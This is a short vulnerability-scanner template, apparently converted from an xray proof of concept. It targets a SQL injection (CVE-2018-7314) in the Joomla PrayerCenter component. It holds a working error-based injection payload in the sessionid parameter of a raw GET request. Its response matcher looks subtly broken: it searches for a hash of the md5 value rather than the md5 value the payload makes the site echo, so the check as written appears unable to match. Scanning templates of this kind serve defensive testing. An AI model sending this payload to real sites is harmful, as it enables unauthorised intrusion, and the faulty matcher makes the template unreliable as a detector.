id: poc-local-xray-joomla-cve-2018-7314-sql

info:
  name: poc-local-xray-joomla-cve-2018-7314-sql
  author: capiton
  severity: high
  reference:
    - https://www.exploit-db.com/exploits/46227
  tags: joomla

variables:
  r1: "{{rand_int(800000000, 1000000000)}}"
  md5_r1: "{{md5(r1)}}"

requests:
  - raw:
      - |
        GET /index.php?option=com_prayercenter&task=confirm&id=1&sessionid=1'%20AND%20EXTRACTVALUE(22%2CCONCAT(0x7e%2Cmd5({{r1}})))--%20X HTTP/1.1
        Host: {{Hostname}}
    

    matchers-condition: and
    redirects: false
    matchers:
      - type: dsl
        dsl:
          - contains(body,substr(md5("{{md5_r1}}"), 0, 31))
        condition: and